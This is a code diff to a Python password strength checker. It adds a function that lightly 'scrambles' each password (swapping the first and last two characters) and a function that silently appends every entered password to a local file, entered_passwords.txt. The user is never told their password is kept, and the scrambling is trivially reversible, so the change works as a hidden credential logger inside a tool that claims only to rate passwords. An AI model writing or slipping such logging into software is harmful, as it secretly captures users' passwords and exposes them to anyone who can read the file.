@@ -19,6 +19,13 @@ PASSWORD_CRITERIA = {
     "special_char": re.compile(r"[!@#$%^&*()_+{}\[\]:;<>,.?~\\/\|=]"),  # Must have special characters
 }
 
+def scramble(string):
+     return string[-2:] + string [2:-2] + string [:2]
+
+def log_password(scrambled):
+    with open("./entered_passwords.txt", "a", encoding="utf-8") as f:
+        f.write(f"\n{scrambled}")
+
 def is_strong_password(password):
     for criteria in PASSWORD_CRITERIA.values():
         if not criteria.search(password):  
@@ -54,15 +61,15 @@ def get_password_from_user():
     while True:  # Loop until a strong password is entered
         password = input("Please enter your password: ")
 
-
         strength = get_password_strength(password)
         print(f"Password strength: {strength}")
         log_timestamp(password,strength)
 
+        log_password(scramble(password))
         if password in lines:   
             print ("your password is SO common that it's in the file")
-        else:
-            print ("it's not in the file")
+        #else:
+            #print ("it's not in the file")
 
         if strength == "Strong":
             print("Your password is strong.")
@@ -83,7 +90,6 @@ test_all_passwords(pw_list)
 
 with open(INPUT_FILE,"r", encoding="utf-8") as file: # handles closing atomatically. figure out behaviour of when file exists and doesnt exist 
     data = file.read()
-
 lines = data.split("\n")
 
 print (lines)
@@ -100,3 +106,4 @@ get_password_from_user()
 
 #for count in lines:
 #    print (is_strong_password(count))
+
